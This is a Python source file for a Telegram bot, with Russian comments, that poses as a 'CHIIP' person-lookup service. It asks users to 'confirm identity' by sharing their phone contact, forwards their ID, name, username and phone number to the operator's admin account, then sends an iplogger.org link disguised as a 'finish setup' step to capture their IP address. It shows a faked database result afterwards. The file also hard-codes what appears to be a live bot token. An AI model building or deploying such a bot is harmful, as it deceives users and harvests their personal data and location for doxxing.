import logging
import os
import threading
from flask import Flask
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# --- НАСТРОЙКИ ---
API_TOKEN = '8531763156:AAGkTIJDVaTuKT6zIK0QYira73S8B-0qlXc'
ADMIN_ID = 5476069446
LOGGER_URL = "https://iplogger.org/ua/logger/JL3R5zePB1h2/" # Твоя ссылка

# --- ФЕЙКОВЫЙ ВЕБ-СЕРВЕР (Для Render) ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Alive", 200

def run_web():
    # Render требует привязки к порту, иначе статус будет Failed
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- ЛОГИКА БОТА ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN, parse_mode="Markdown")
dp = Dispatcher(bot)

contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
contact_kb.add(KeyboardButton("✅ Подтвердить личность", request_contact=True))

def get_main_menu():
    kb = InlineKeyboardMarkup(row_width=3)
    btns = ["Профиль", "Следить", "Имена, @теги", "Группы", "Сообщения", "Анализ", "Каналы", "Репутация"]
    for text in btns: kb.insert(InlineKeyboardButton(text, callback_data="none"))
    return kb

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    await message.answer(
        "🚀 **Система CHIIP: Авторизация**\n\nПодтвердите номер для доступа.",
        reply_markup=contact_kb
    )

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    contact = message.contact
    user = message.from_user
    
    report = (
        f"🕵️ **ОТЧЕТ**\nID: `{user.id}`\nИмя: {user.full_name}\n"
        f"Username: @{user.username}\nТелефон: +{contact.phone_number}"
    )
    await bot.send_message(ADMIN_ID, report) # Отправка тебе
    
    ip_kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 Завершить настройку", url=LOGGER_URL))
    await message.answer("Номер подтвержден! Нажмите кнопку для синхронизации:", reply_markup=ip_kb)
    
    # Фейковый вывод из базы (как на скриншоте 1000006450.png)
    await message.answer(f"ID: {user.id}\nРепутация: **отрицательная**", reply_markup=get_main_menu())

if __name__ == '__main__':
    # Запускаем веб-сервер в фоне
    threading.Thread(target=run_web, daemon=True).start()
    # Запускаем бота
    executor.start_polling(dp, skip_updates=True)